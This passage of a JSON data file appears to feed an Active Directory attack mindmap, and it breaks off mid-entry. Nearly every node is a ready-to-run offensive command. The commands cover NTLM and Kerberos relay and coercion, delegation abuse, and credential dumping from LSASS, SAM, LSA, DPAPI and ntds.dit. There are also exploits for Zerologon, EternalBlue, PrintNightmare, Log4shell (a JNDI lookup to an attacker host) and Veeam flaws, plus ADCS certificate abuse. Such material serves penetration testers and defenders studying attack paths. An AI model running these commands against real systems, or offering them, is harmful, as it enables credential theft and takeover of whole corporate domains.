\u003cfile>.searchConnector-ms","children":[{"id":"low_access-523","label":"","children":[{"id":"low_access-524","label":"","cmd":"petitpotam.py -u '$USER' -p $PASSWORD -d '$DOMAIN' \"attacker@80/random.txt\" $TARGET"}],"cmd":"dnstool.py -u $DOMAIN\\$USER -p $PASSWORD --record 'attacker' --action add --data $LISTENER $DC_IP"}]}],"outcome":"HTTP Coerce"},{"id":"low_access-525","label":"Kerberos Relay","children":[{"id":"low_access-526","label":"","children":[{"id":"low_access-527","label":"","cmd":"KrbRelayUp.exe spawn -m rbcd -d $DOMAIN -dc $DC_IP -cn $COMPUTER_NAME-cp $COMPUTER_PASS"}],"cmd":"KrbRelayUp.exe relay -Domain $DOMAIN -CreateNewComputerAccount -ComputerName $COMPUTER -ComputerPassword $PASSWORD"}],"outcome":"Admin"},{"id":"low_access-528","label":"From Service account (SEImpersonate)","children":[{"id":"low_access-529","label":"RoguePatato"},{"id":"low_access-530","label":"GodPotato"},{"id":"low_access-531","label":"PrintSpoofer"},{"id":"low_access-532","label":"RemotePotato0"}],"outcome":"Admin"}],"row":0,"col":3},{"id":"delegation","label":"Kerberos Delegation","color":"#099268","children":[{"id":"delegation-313","label":"Find delegation","children":[{"id":"delegation-314","label":"","cmd":"findDelegation.py \"$DOMAIN\"/\"$USER\":\"$PASSWORD\""},{"id":"delegation-315","label":"With BloodHound","children":[{"id":"delegation-316","label":"Unconstrained","children":[{"id":"delegation-317","label":"","cmd":"MATCH (c:Computer {unconstraineddelegation:true}) RETURN c"},{"id":"delegation-318","label":"","cmd":"MATCH (c:User {unconstraineddelegation:true}) RETURN c"}]},{"id":"delegation-319","label":"Constrained","children":[{"id":"delegation-320","label":"","cmd":"MATCH p=((c:Base)-[:AllowedToDelegate]->(t:Computer)) RETURN p"},{"id":"delegation-321","label":"","cmd":"MATCH p=shortestPath((u:User)-[*1..]->(c:Computer {name: \"$TARGET_NAME\"})) RETURN p"}]}]}]},{"id":"delegation-322","label":"Unconstrained delegation","children":[{"id":"delegation-323","label":"UAC: ADS_UF_TRUSTED_FOR_DELEGATION","children":[{"id":"delegation-324","label":"Force connection  with coerce","children":[{"id":"delegation-325","label":"Get tickets","children":[{"id":"delegation-326","label":"","cmd":"mimikatz privilege::debug sekurlsa::tickets /export sekurlsa::tickets /export"},{"id":"delegation-327","label":"","cmd":"Rubeus.exe dump /service:krbtgt /nowrap"},{"id":"delegation-328","label":"","cmd":"Rubeus.exe dump /luid:0xdeadbeef /nowrap"},{"id":"delegation-329","label":"","cmd":"Rubeus.exe monitor /interval:5"}]}]}]}],"outcome":"Kerberos TGT >>> PassTheTicket"},{"id":"delegation-330","label":"Constrained delegation","children":[{"id":"delegation-331","label":"With protocol transition (any) UAC: TRUST_TO_AUTH_FOR_DELEGATION","children":[{"id":"delegation-332","label":"Get TGT for user","children":[{"id":"delegation-333","label":"Request S4u2self","children":[{"id":"delegation-334","label":"Request S4u2proxy"}]}]},{"id":"delegation-335","label":"","children":[{"id":"delegation-336","label":"","children":[{"id":"delegation-337","label":"","children":[{"id":"delegation-338","label":"Altservice HTTP/HOST/CIFS/LDAP","outcome":"Kerberos TGS"}],"cmd":"Rubeus.exe s4u /ticket:$TICKET /impersonateuser:$USER /msdsspn:$SPN_CONSTRAINED /altservice:$ALTSERVICE /ptt"}],"cmd":"Rubeus.exe asktgt /user:$USER /domain:$DOMAIN /aes256:$AESKEY"}],"cmd":"Rubeus.exe hash /password:$PASSWORD"},{"id":"delegation-339","label":"","children":[{"id":"delegation-340","label":"Altservice HTTP/HOST/CIFS/LDAP","outcome":"Kerberos TGS"}],"cmd":"getST.py -spn '$SPN/$TARGET' -impersonate Administrator -dc-ip '$DC_IP' '$DOMAIN/$USER:$PASSWORD' -altservice $ALTSERVICE"}]},{"id":"delegation-341","label":"Without protocol transition (kerberos only) UAC: TRUSTED_FOR_DELEGATION","children":[{"id":"delegation-342","label":"Constrain between Y and Z","children":[{"id":"delegation-343","label":"Add computer X","children":[{"id":"delegation-344","label":"Add RBCD : delegate from X to Y","children":[{"id":"delegation-345","label":"s4u2self X (impersonate admin)","children":[{"id":"delegation-346","label":"S4u2Proxy X (impersonate admin on spn/Y)","children":[{"id":"delegation-347","label":"Forwardable TGS for Y","children":[{"id":"delegation-348","label":"S4u2Proxy Y (impersonate admin on spn/Z)"}]}]}]}]}]}]},{"id":"delegation-349","label":"add computer account","children":[{"id":"delegation-350","label":"","cmd":"addcomputer.py -computer-name '$COMPUTER_NAME' -computer-pass '$COMPUTER_PASS' -dc-host $DC_IP -domain-netbios $DOMAIN '$DOMAIN/$USER:$PASSWORD'"}]},{"id":"delegation-351","label":"RBCD With added computer account","children":[{"id":"delegation-352","label":"","children":[{"id":"delegation-353","label":"","children":[{"id":"delegation-354","label":"","cmd":"getST.py -spn $CONSTRAINED_SPN/$TARGET -hashes '$NT_HASH' '$DOMAIN/$TARGET_NAME$' -impersonate Administrator --dc-ip $DC_IP -additional-ticket $PREVIOUS_TICKET"}],"cmd":"getST.py -spn host/$TARGET_NAME -impersonate Administrator --dc-ip $DC_IP '$DOMAIN/$COMPUTER_NAME$:$RBCD_CONPASS'"}],"cmd":"rbcd.py -delegate-from '$COMPUTER_NAME$' -delegate-to '$TARGET_NAME$' -dc-ip '$DC_IP' -action 'write' -hashes '$NT_HASH' $DOMAIN/$TARGET_NAME$"}],"outcome":"Kerberos TGS"},{"id":"delegation-355","label":"Self RBCD","children":[{"id":"delegation-356","label":"Like RBCD without add computer"}]}]}]},{"id":"delegation-357","label":"Resource-Based Constrained Delegation","children":[{"id":"delegation-358","label":"add computer account","children":[{"id":"delegation-359","label":"","cmd":"addcomputer.py -computer-name '$COMPUTER_NAME' -computer-pass '$COMPUTER_PASS' -dc-host $DC_IP -domain-netbios $DOMAIN '$DOMAIN/$USER:$PASSWORD'"}]},{"id":"delegation-360","label":"RBCD With added computer account","children":[{"id":"delegation-361","label":"","children":[{"id":"delegation-362","label":"","cmd":"Rubeus.exe s4u /user:$COMPUTER_NAME /aes256:$AESKEY /impersonateuser:administrator /msdsspn:cifs/$DOMAIN /altservice:krbtgt,cifs,host,http,winrm,RPCSS,wsman,ldap /domain:domain.local /ptt","outcome":"Admin"}],"cmd":"Rubeus.exe hash /password:$COMPUTER_PASS /user:$COMPUTER /domain:$DOMAIN"},{"id":"delegation-363","label":"","children":[{"id":"delegation-364","label":"","cmd":"getST.py -spn host/$DC_NAME '$DOMAIN/$COMPUTER_NAME:$COMPUTER_PASS' -impersonate Administrator --dc-ip $DC_IP","outcome":"Kerberos TGT >>> Admin"}],"cmd":"rbcd.py -delegate-from '$COMPUTER$' -delegate-to '$TARGET$' -dc-ip '$DC_IP' -action 'write' $DOMAIN/$USER:$PASSWORD"}]}]},{"id":"delegation-365","label":"S4U2self abuse","children":[{"id":"delegation-366","label":"Get machine account (X)'s TGT","children":[{"id":"delegation-367","label":"Get a ST on X as user admin"}]},{"id":"delegation-368","label":"","children":[{"id":"delegation-369","label":"","cmd":"getST.py -self -impersonate \"$USER\" -altservice \"cifs/$COMPUTER_NAME\" -k -no-pass -dc-ip \"DomainController\" \"$DOMAIN\"/'$COMPUTER_NAME$'","outcome":"Admin"}],"cmd":"getTGT.py -dc-ip \"$DC_IP\" -hashes :\"$COMPUTER_HASH\" \"$DOMAIN\"/\"$COMPUTER_NAME$\""}]}],"row":0,"col":4},{"id":"admin","label":"Admin access","color":"#FAD9D5","children":[{"id":"admin-144","label":"Extract credentials from LSASS.exe","children":[{"id":"admin-145","label":"LSASS as protected process","children":[{"id":"admin-146","label":"","cmd":"PPLdump64.exe $LSASS_EXE_LSASS_PID lsass.dmp #before 2022-07-22 update"},{"id":"admin-147","label":"","cmd":"mimikatz \"!+\" \"!processprotect /process:lsass.exe /remove\" \"privilege::debug\" \"token::elevate\"  \"sekurlsa::logonpasswords\" \"!processprotect  /process:lsass.exe\" \"!-\""}]},{"id":"admin-148","label":"Extract LSASS secrets","children":[{"id":"admin-149","label":"","cmd":"procdump.exe -accepteula -ma lsass.exe lsass.dmp"},{"id":"admin-150","label":"","cmd":"mimikatz \"privilege::debug\" \"token::elevate\" \"sekurlsa::logonpasswords\"  \"exit\""},{"id":"admin-151","label":"","cmd":"msf> load kiwi creds_all"},{"id":"admin-152","label":"","cmd":"nxc smb $IP_RANGE -u $USER -p $PASSWORD -M lsassy"},{"id":"admin-153","label":"","cmd":"lsassy -d $DOMAIN -u $USER -p $PASSWORD $TARGET"}],"outcome":"User + Pass || NTLM || PassTheHash || Clear text move"}]},{"id":"admin-154","label":"Extract credentials from SAM","children":[{"id":"admin-155","label":"","cmd":"nxc smb $IP_RANGE -u $USER -p $PASSWORD --sam"},{"id":"admin-156","label":"","cmd":"msf> hashdump"},{"id":"admin-157","label":"","cmd":"mimikatz \"privilege::debug\" \"lsadump::sam\" \"exit\""},{"id":"admin-158","label":"","cmd":"secretsdump.py $DOMAIN/$USER:$PASSWORD@$TARGET"},{"id":"admin-159","label":"","children":[{"id":"admin-160","label":"","cmd":"secretsdump.py -system SYSTEM -sam SAM LOCAL"}],"cmd":"reg save HKLM\\SAM $FILE;  reg save HKLM\\SYSTEM $FILE"},{"id":"admin-161","label":"","children":[{"id":"admin-162","label":"","cmd":"secretsdump.py -system SYSTEM -sam SAM LOCAL"}],"cmd":"reg.py $DOMAIN/$USER:$PASSWORD@$TARGET backup -o '\\\\$SMB_IP\\share'"},{"id":"admin-163","label":"","cmd":"regsecrets.py $DOMAIN/$USER:$PASSWORD@$TARGET"}],"outcome":"NTLM || PassTheHash"},{"id":"admin-164","label":"Extract credentials from LSA","children":[{"id":"admin-165","label":"","cmd":"nxc smb $IP_RANGE -u $USER -p $PASSWORD --lsa"},{"id":"admin-166","label":"","cmd":"mimikatz \"privilege::debug\" \"lsadump::lsa\" \"exit\""},{"id":"admin-167","label":"","children":[{"id":"admin-168","label":"","cmd":"secretsdump.py -system SYSTEM -security SECURITY"}],"cmd":"reg save HKLM\\SECURITY $FILE;  reg save HKLM\\SYSTEM $FILE"},{"id":"admin-169","label":"","cmd":"reg.py $DOMAIN/$USER:$PASSWORD@$TARGET backup -o '\\\\$SMB_IP\\share'"}],"outcome":"MsCache 2 || User + Pass"},{"id":"admin-170","label":"Extract credentials from DPAPI","children":[{"id":"admin-171","label":"DPAPI","children":[{"id":"admin-172","label":"","cmd":"nxc smb $IP_RANGE -u $USER -p $PASSWORD --dpapi [cookies] [nosystem]"},{"id":"admin-173","label":"","cmd":"donpapi $DOMAIN/$USER:$PASSWORD@$TARGET"},{"id":"admin-174","label":"","cmd":"dpapidump.py $DOMAIN/$USER:$PASSWORD@$TARGET"},{"id":"admin-175","label":"get masterkey","children":[{"id":"admin-176","label":"","children":[{"id":"admin-177","label":"","cmd":"dploot.py browser -d $DOMAIN -u $USER -p '$PASSWORD' $TARGET -mkfile $MASTERKEYS_FILE"}],"cmd":"mimikatz \"sekurlsa::dpapi\""},{"id":"admin-178","label":"","children":[{"id":"admin-179","label":"","cmd":"dploot.py browser -d $DOMAIN -u $USER -p '$PASSWORD' $TARGET -mkfile $MASTERKEYS_FILE"}],"cmd":"lsassy -d $DOMAIN -u $USER -p $PASSWORD $TARGET -m rdrleakdiag -M masterkeys"}]},{"id":"admin-180","label":"","cmd":"SharpDPAPI.exe triage"}],"outcome":"User + Pass || PassTheHash || Clear text move"},{"id":"admin-181","label":"Crack users masterkey","children":[{"id":"admin-182","label":"copy c:\\users\\\u003cuser>\\AppData\\Roaming\\Microsoft\\Protect\\\u003cSID>","children":[{"id":"admin-183","label":"","children":[{"id":"admin-184","label":"","cmd":"DPAPImk2john.py -c domain -mk $MASTERKEY -S $SID"}],"cmd":"DPAPImk2john.py --preferred $PREFERED_FILE"}]}],"outcome":"DPAPImk"}]},{"id":"admin-185","label":"Impersonate","children":[{"id":"admin-186","label":"Impersonate","children":[{"id":"admin-187","label":"","cmd":"msf> use incognito impersonate_token $DOMAIN\\\\$USER"},{"id":"admin-188","label":"","children":[{"id":"admin-189","label":"","cmd":"nxc smb $TARGET -u $USER -p $PASSWORD -M schtask_as -o USER=$LOGGED_ON_USER CMD=$CMD_COMMAND"}],"cmd":"nxc smb $TARGET -u $USER -p $PASSWORD --loggedon-users"},{"id":"admin-190","label":"","children":[{"id":"admin-191","label":"","cmd":"irs.exe exec -p $PID -c $COMMAND"}],"cmd":"irs.exe list"}],"outcome":"ACL || User + Pass"},{"id":"admin-192","label":"Impersonate with adcs","children":[{"id":"admin-193","label":"","cmd":"masky - d $DOMAIN -u $USER  (-p $PASSWORD || -k || -H $NT_HASH) -ca $CERTIFICATE_AUTHORITY $TARGET"}],"outcome":"NTLM || Pass The Hash / Ticket / Certificate"},{"id":"admin-194","label":"Impersonate RDP Session","children":[{"id":"admin-195","label":"","children":[{"id":"admin-196","label":"","children":[{"id":"admin-197","label":"","cmd":"tscon.exe $ID /dest:$SESSION_NAME"}],"cmd":"query user"}],"cmd":"psexec.exe -s -i cmd"}],"outcome":"RDP"}]},{"id":"admin-198","label":"Misc","children":[{"id":"admin-199","label":"Find Users","children":[{"id":"admin-200","label":"","cmd":"smbmap.py --host-file ./computers.list -u $USER -p $PASSWORD -d $DOMAIN -r 'C$\\Users' --dir-only --no-write-check --no-update --no-color --csv users_directory.csv"}],"outcome":"Username"},{"id":"admin-201","label":"Extract Keepass","children":[{"id":"admin-202","label":"","cmd":"KeePwn.py plugin add -u '$USER' -p '$PASSWORD' -d '$DOMAIN' -t $TARGET --plugin KeeFarceRebornPlugin.dll"},{"id":"admin-203","label":"","cmd":"KeePwn.py trigger add -u '$USER' -p '$PASSWORD' -d '$DOMAIN' -t $TARGET"}],"outcome":"User + Pass"},{"id":"admin-204","label":"Hybrid (Azure AD-Connect)","children":[{"id":"admin-205","label":"Dump cleartext password of MSOL Account on ADConnect Server","children":[{"id":"admin-206","label":"","cmd":"azuread_decrypt_msol_v2.ps1"},{"id":"admin-207","label":"","cmd":"nxc smb $TARGET -u $USER -p $PASSWORD -M msol"}]}],"outcome":"DCSYNC"}]}],"row":0,"col":5},{"id":"dom_admin","label":"Domain admin","color":"#E51400","children":[{"id":"dom_admin-370","label":"Dump ntds.dit","children":[{"id":"dom_admin-371","label":"","cmd":"nxc smb $DC_IP -u $USER -p $PASSWORD -d $DOMAIN --ntds"},{"id":"dom_admin-372","label":"","cmd":"secretsdump.py '$DOMAIN/$USER:$PASSWORD'@$TARGET"},{"id":"dom_admin-373","label":"","children":[{"id":"dom_admin-374","label":"","cmd":"secretsdump.py -ntds NTDS -system SYSTEM -hashes $NT_HASH LOCAL -outputfile $OUTPUT"}],"cmd":"ntdsutil \"ac i ntds\" \"ifm\" \"create full c:\\temp\" q q"},{"id":"dom_admin-375","label":"","cmd":"msf> windows/gather/credentials/domain_hashdump"},{"id":"dom_admin-376","label":"","cmd":"mimikatz lsadump::dcsync /domain:$DOMAIN /user:$DOMAIN\\administrator"},{"id":"dom_admin-377","label":"","cmd":"certsync -u $USER -p '$PASSWORD' -d $DOMAIN -dc-ip $DC_IP -ns $DC_NAME"}],"outcome":"Lateral move || Crack hash"},{"id":"dom_admin-378","label":"Grab backup Keys","children":[{"id":"dom_admin-379","label":"","cmd":"donpapi collect - H ':$NT_HASH' $DOMAIN/$USER@$IP_RANGE -t ALL --fetch-pvk"}],"outcome":"Credentials"}],"row":0,"col":6},{"id":"low_hanging","label":"Quick Compromise","color":"#ebfbee","children":[{"id":"low_hanging-533","label":"⚠️ Zerologon (unsafe) CVE-2020-1472","children":[{"id":"low_hanging-534","label":"","cmd":"zerologon-scan '$DC_NAME' '$TARGET'"},{"id":"low_hanging-535","label":"","cmd":"cve-2020-1472-exploit.py $DC_NAME $TARGET"}],"outcome":"Domain admin"},{"id":"low_hanging-536","label":"Eternal Blue MS17-010","children":[{"id":"low_hanging-537","label":"","cmd":"msf> exploit/windows/smb/ms17_010_eternalblue # SMBv1 only"}],"outcome":"Admin || Low access"},{"id":"low_hanging-538","label":"Tomcat/Jboss Manager","children":[{"id":"low_hanging-539","label":"","cmd":"msf> auxiliary/scanner/http/tomcat_enum"},{"id":"low_hanging-540","label":"","cmd":"msf> exploit/multi/http/tomcat_mgr_deploy"}],"outcome":"Admin || Low access"},{"id":"low_hanging-541","label":"Java RMI","children":[{"id":"low_hanging-542","label":"","cmd":"msf> use exploit/multi/misc/java_rmi_server"}],"outcome":"Admin || Low access"},{"id":"low_hanging-543","label":"Java Serialiszed port","children":[{"id":"low_hanging-544","label":"","cmd":"ysoserial.jar $GADGET '$CMD' |nc $TARGET $PORT"}],"outcome":"Admin || Low access"},{"id":"low_hanging-545","label":"Log4shell","children":[{"id":"low_hanging-546","label":"${jndi:ldap://\u003cip>:\u003cport>/o=reference}"}],"outcome":"Admin || Low access"},{"id":"low_hanging-547","label":"Database","children":[{"id":"low_hanging-548","label":"","cmd":"msf> use auxiliary/admin/mssql/mssql_enum_sql_logins"}],"outcome":"Admin || Low access"},{"id":"low_hanging-549","label":"Exchange","children":[{"id":"low_hanging-550","label":"Proxyshell","children":[{"id":"low_hanging-551","label":"","cmd":"proxyshell_rce.py -u https://$TARGET -e administrator@$DOMAIN"}]}],"outcome":"Admin"},{"id":"low_hanging-552","label":"Veeam","children":[{"id":"low_hanging-553","label":"CVE-2023-27532 (creds - Veeam backup)","children":[{"id":"low_hanging-554","label":"","cmd":"VeeamHax.exe --target $TARGET"},{"id":"low_hanging-555","label":"","cmd":"CVE-2023-27532 net.tcp:/$TARGET:$PORT/"}]},{"id":"low_hanging-556","label":"CVE-2024-29849 (auth bypass - Veeam Backup Enterprise Manager)","children":[{"id":"low_hanging-557","label":"","cmd":"CVE-2024-29849.py --target https://$TARGET:$PORT/ --callback-server $LISTENER:$PORT"}]},{"id":"low_hanging-558","label":"CVE-2024-29855 (auth bypass - Veeam Recovery Orchestrator)","children":[{"id":"low_hanging-559","label":"","cmd":"CVE-2024-29855.py  --start_time $START_TIME_EPOCH --end_time $END_TIME_EPOCH --username $USER@$DOMAIN --target https://$TARGET:$PORT/"}]},{"id":"low_hanging-560","label":"CVE-2024-40711 (unserialize - Veeam backup)","children":[{"id":"low_hanging-561","label":"","cmd":"CVE-2024-40711.exe -f binaryformatter -g Veeam -c http://$LISTENER:8000/trigger --targetveeam $TARGET"}]}],"outcome":"User Account || Low access || Admin"},{"id":"low_hanging-562","label":"GLPI","children":[{"id":"low_hanging-563","label":"CVE-2022-35914","children":[{"id":"low_hanging-564","label":"/vendor/htmlawed/htmlawed/htmLawedTest.php"}]},{"id":"low_hanging-565","label":"CVE_2023_41320","children":[{"id":"low_hanging-566","label":"","cmd":"cve_2023_41320.py -u $USER -p $PASSWORD -t $TARGET"}]}],"outcome":"Admin || Low access"},{"id":"low_hanging-567","label":"Weak websites / services","children":[{"id":"low_hanging-568","label":"nuclei","children":[{"id":"low_hanging-569","label":"","cmd":"nuclei -target $IP_RANGE"}]},{"id":"low_hanging-570","label":"nessus"}]}],"row":1,"col":0},{"id":"mitm","label":"Man In The Middle (Listen and Relay)","color":"#ffff00","children":[{"id":"mitm-571","label":"Listen","children":[{"id":"mitm-572","label":"","cmd":"responder -l $INTERFACE #use --lm to force downgrade"},{"id":"mitm-573","label":"","cmd":"smbclient.py"}],"outcome":"Hash NTLMv1 or NTLMv2 || Username || Credentials (ldap/http)"},{"id":"mitm-574","label":"NTLM relay","children":[{"id":"mitm-575","label":"MS08-068 self relay","children":[{"id":"mitm-576","label":"","cmd":"msf> exploit/windows/smb_smb_relay # windows 2000 / windows server 2008"}]},{"id":"mitm-577","label":"SMB -> LDAP(S)","children":[{"id":"mitm-578","label":"NTLMv1","children":[{"id":"mitm-579","label":"remove mic (no CVE needed)","outcome":"see LDAP(S)"}]},{"id":"mitm-580","label":"NTLMv2","children":[{"id":"mitm-581","label":"Remove mic (CVE-2019-1040)","outcome":"see LDAP(S)"}]}]},{"id":"mitm-582","label":"HTTP(S) -> LDAP(S)","children":[{"id":"mitm-583","label":"Usually from webdav coerce","outcome":"see LDAP(S)"}]},{"id":"mitm-584","label":"To LDAP(S)","children":[{"id":"mitm-585","label":"Relay to LDAP if LDAP signing and LDAPS channel binding not enforced (default)","children":[{"id":"mitm-586","label":"","cmd":"ntlmrelayx.py -t ldaps://$DC_IP --remove-mic -smb2support --add-computer $COMPUTER_NAME $COMPUTER_PASS --delegate-access","outcome":"RBCD"},{"id":"mitm-587","label":"","cmd":"ntlmrelayx.py -t ldaps://$DC_IP --remove-mic -smb2support --shadow-credentials --shadow-target '$DC_NAME'","outcome":"Shadow Credentials"},{"id":"mitm-588","label":"","cmd":"ntlmrelayx.py -t ldaps://$DC_IP --remove-mic -smb2support --escalate-user $USER","outcome":"Domain admin"},{"id":"mitm-589","label":"","cmd":"ntlmrelayx.py -t ldaps://$DC_IP --remove-mic -smb2support --interactive # connect to ldap_shell with nc 127.0.0.1 10111","outcome":"LDAP SHELL"}]}]},{"id":"mitm-590","label":"To SMB","children":[{"id":"mitm-591","label":"Relay to SMB (if SMB is not signed)","children":[{"id":"mitm-592","label":"Find SMB not signed targets (default if not a Domain controler)","children":[{"id":"mitm-593","label":"","cmd":"nxc smb $IP_RANGE --gen-relay-list smb_unsigned_ips.txt"}]},{"id":"mitm-594","label":"","cmd":"ntlmrelayx.py -tf smb_unsigned_ips.txt -smb2support [--ipv6] -socks","outcome":"SMB Socks"}]}]},{"id":"mitm-595","label":"To HTTP","children":[{"id":"mitm-596","label":"Relay to CA web enrollement","outcome":"ESC8"},{"id":"mitm-597","label":"Relay to WSUS","outcome":"WSUS"}]},{"id":"mitm-598","label":"To MsSQL","children":[{"id":"mitm-599","label":"","cmd":"ntlmrelayx.py -t mssql://$TARGET [-smb2support] -socks","outcome":"MSSQL Socks"}]},{"id":"mitm-600","label":"SMB -> NETLOGON","children":[{"id":"mitm-601","label":"Zero-Logon (safe method) (CVE-202-1472)","children":[{"id":"mitm-602","label":"Relay one dc to another","children":[{"id":"mitm-603","label":"","cmd":"ntlmrelayx.py -t dcsync://$DC_IP -smb2support -auth-smb $USER:$PASSWORD","outcome":"DCSYNC"}]}]}]}]},{"id":"mitm-604","label":"Kerberos relay","children":[{"id":"mitm-605","label":"To HTTP","children":[{"id":"mitm-606","label":"","cmd":"krbrelayx.py -t 'http://$TARGET/certsrv/certfnsh.asp' --adcs --template DomainController -v '$TARGET_NAME$' -ip $LISTENER","outcome":"ESC8"}]},{"id":"mitm-607","label":"SMB -> SMB","children":[{"id":"mitm-608","label":"same as NTLM relay, use krbrelayx.py"}]},{"id":"mitm-609","label":"SMB -> LDAP(S)","children":[{"id":"mitm-610","label":"same as NTLM relay, use krbrelayx.py"}]}]}],"row":1,"col":1},{"id":"know_vuln_auth","label":"Know vulnerabilities authenticated","color":"#FAD7AC","children":[{"id":"know_vuln_auth-380","label":"MS14-068","children":[{"id":"know_vuln_auth-381","label":"","children":[{"id":"know_vuln_auth-382","label":"","cmd":"ms14-068.py -u $USER@$DOMAIN -p $PASSWORD -s $USER_SID -d $DC_NAME"},{"id":"know_vuln_auth-383","label":"","cmd":"msf> use auxiliary/admin/kerberos/ms14_068_kerberos_checksum"},{"id":"know_vuln_auth-384","label":"","cmd":"goldenPac.py -dc-ip $DC_IP $DOMAIN/$USER:$PASSWORD@target"}],"cmd":"findSMB2UPTime.py $TARGET"}],"outcome":"PTT >>> Domain admin || Admin"},{"id":"know_vuln_auth-385","label":"GPP MS14-025","children":[{"id":"know_vuln_auth-386","label":"","cmd":"msf> use auxiliary/scanner/smb/smb_enum_gpp"},{"id":"know_vuln_auth-387","label":"","cmd":"findstr /S /I cpassword \\\\$DOMAIN_FQDN\\sysvol\\$DOMAIN_FQDN\\policies\\*.xml"},{"id":"know_vuln_auth-388","label":"","cmd":"Get-GPPPassword.py $DOMAIN/$USER:$PASSWORD@$DC_NAME"}],"outcome":"Domain admin"},{"id":"know_vuln_auth-389","label":"PrivExchange (CVE-2019-0724, CVE-2019-0686)","children":[{"id":"know_vuln_auth-390","label":"","cmd":"privexchange.py -ah $LISTENER $TARGET -u $USER -d $DOMAIN -p $PASSWORD"}],"outcome":"HTTP Coerce >>> Domain admin || Admin"},{"id":"know_vuln_auth-391","label":"noPac (CVE-2021-42287, CVE-2021-42278)","children":[{"id":"know_vuln_auth-392","label":"","cmd":"nxc smb $TARGET -u 'user' -p 'pass' -M nopac #scan"},{"id":"know_vuln_auth-393","label":"","cmd":"noPac.exe -domain $DOMAIN -user $USER -pass $PASSWORD /dc $DC_NAME /mAccount $COMPUTER_NAME /mPassword $COMPUTER_PASS /service cifs /ptt"}],"outcome":"PTT >>> DCSYNC >>> Domain admin"},{"id":"know_vuln_auth-394","label":"PrintNightmare (CVE-2021-1675, CVE-2021-34527)","children":[{"id":"know_vuln_auth-395","label":"","cmd":"nxc smb $TARGET -u 'user' -p 'pass' -M printnightmare #scan"},{"id":"know_vuln_auth-396","label":"","cmd":"printnightmare.py -dll '\\\\$LISTENER\\smb\\add_user.dll' '$USER:$PASSWORD@$TARGET'"}],"outcome":"Admin"},{"id":"know_vuln_auth-397","label":"Certifried (CVE-2022-26923)","children":[{"id":"know_vuln_auth-398","label":"Create account","children":[{"id":"know_vuln_auth-399","label":"","cmd":"certipy account create -u $USER@$DOMAIN -p '$PASSWORD' -user 'certifriedpc' -pass 'certifriedpass' -dns '$DC_NAME'"}]},{"id":"know_vuln_auth-400","label":"Request","children":[{"id":"know_vuln_auth-401","label":"","cmd":"certipy req -u 'certifriedpc$'@$DOMAIN -p 'certifriedpass' -target $TARGET_NAME -ca $CA_NAME -template Machine"}]},{"id":"know_vuln_auth-402","label":"Authentication","children":[{"id":"know_vuln_auth-403","label":"","cmd":"certipy auth -pfx $PFX_FILE -username '$DC_NAME$' -domain $DOMAIN -dc-ip $DC_IP"}]}],"outcome":"PTT >>> DCSYNC >>> Domain admin"},{"id":"know_vuln_auth-404","label":"ProxyNotShell (CVE-2022-41040, CVE-2022-41082)","children":[{"id":"know_vuln_auth-405","label":"","cmd":"poc_aug3.py $TARGET $USER $PASSWORD $COMMAND"}],"outcome":"Admin"}],"row":1,"col":3},{"id":"adcs","label":"ADCS","color":"#990099","children":[{"id":"adcs-63","label":"Enumeration","children":[{"id":"adcs-64","label":"","cmd":"certutil -v -dsTemplate"},{"id":"adcs-65","label":"","cmd":"certify.exe find [ /vulnerable]"},{"id":"adcs-66","label":"","cmd":"certipy find -u $USER@$DOMAIN -p $PASSWORD -dc-ip $DC_IP"},{"id":"adcs-67","label":"","cmd":"ldeep ldap -u $USER -p $PASSWORD -d $DOMAIN -s $DC_IP templates"},{"id":"adcs-68","label":"Get PKI objects information","children":[{"id":"adcs-69","label":"","cmd":"certify.exe pkiobjects"}]},{"id":"adcs-70","label":"Display CA information","children":[{"id":"adcs-71","label":"","cmd":"certutil -TCAInfo"},{"id":"adcs-72","label":"","cmd":"certify.exe cas"}]}],"outcome":"Web enrollement || Vulnerable template || Vulnerable CA || Misconfigured ACL || Vulnerable PKI Object AC"},{"id":"adcs-73","label":"Web Enrollment Is Up","children":[{"id":"adcs-74","label":"ESC8","children":[{"id":"adcs-75","label":"","children":[{"id":"adcs-76","label":"","cmd":"Rubeus.exe asktgt /user:$USER /certificate:$BASE64_CERTIFICATE /ptt"},{"id":"adcs-77","label":"","cmd":"gettgtpkinit.py -pfx-base64 $(cat cert.b64) $DOMAIN/$DC_NAME$ $CCACHE_FILE"}],"cmd":"ntlmrelayx.py -t http://$DC_IP/certsrv/certfnsh.asp -debug -smb2support --adcs --template DomainController"},{"id":"adcs-78","label":"","children":[{"id":"adcs-79","label":"","cmd":"certipy auth -pfx $PFX_FILE -dc-ip $DC_IP"}],"cmd":"certipy relay -target http://$TARGET"}],"outcome":"Pass the ticket >>> DCSYNC || LDAP shell"}],"outcome":"Domain admin"},{"id":"adcs-80","label":"Misconfigured Certificate Template","children":[{"id":"adcs-81","label":"ESC1","children":[{"id":"adcs-82","label":"","cmd":"certipy req -u $USER@$DOMAIN -p $PASSWORD -target $TARGET -template '$VULN_TEMPLATE'  -ca $CA_NAME -upn $USER@$DOMAIN"},{"id":"adcs-83","label":"","cmd":"certify.exe request /ca:$TARGET\\$CA_NAME   /template:\"$VULN_TEMPLATE\" [/altname:\"Admin\"]"}],"outcome":"Pass the certificate"},{"id":"adcs-84","label":"ESC2","outcome":"ESC3"},{"id":"adcs-85","label":"ESC3","children":[{"id":"adcs-86","label":"","children":[{"id":"adcs-87","label":"","cmd":"certify.exe request request /ca:$TARGET\\$CA_NAME /template:$TEMPLATE  /onbehalfof:$DOMAIN\\$USER /enrollcert:$PFX_FILE [/enrollcertpw:$PASSWORD]"}],"cmd":"certify.exe request /ca:$TARGET\\$CA_NAME /template:\"$VULN_TEMPLATE\""},{"id":"adcs-88","label":"","children":[{"id":"adcs-89","label":"","cmd":"certipy req -u $USER@$DOMAIN -p $PASSWORD -target $TARGET -template  '$VULN_TEMPLATE'  -ca $CA_NAME -on-behalf-of '$DOMAIN\\$USER' -pfx $PFX_FILE"}],"cmd":"certipy req -u $USER@$DOMAIN -p $PASSWORD -target $TARGET -template '$VULN_TEMPLATE'  -ca $CA_NAME"}]},{"id":"adcs-90","label":"ESC13","children":[{"id":"adcs-91","label":"","cmd":"certipy req -u $USER@$DOMAIN -p $PASSWORD -target $TARGET  -template '$VULN_TEMPLATE' -ca $CA_NAME"},{"id":"adcs-92","label":"","cmd":"certify.exe request /ca:$TARGET\\$CA_NAME /template:\"$VULN_TEMPLATE\""}],"outcome":"Pass The Certificate (PKINIT)"},{"id":"adcs-93","label":"ESC15","children":[{"id":"adcs-94","label":"","cmd":"certipy req -u $USER@$DOMAIN -p $PASSWORD -target $TARGET -template '$VULN_TEMPLATE' -ca $CA_NAME -upn 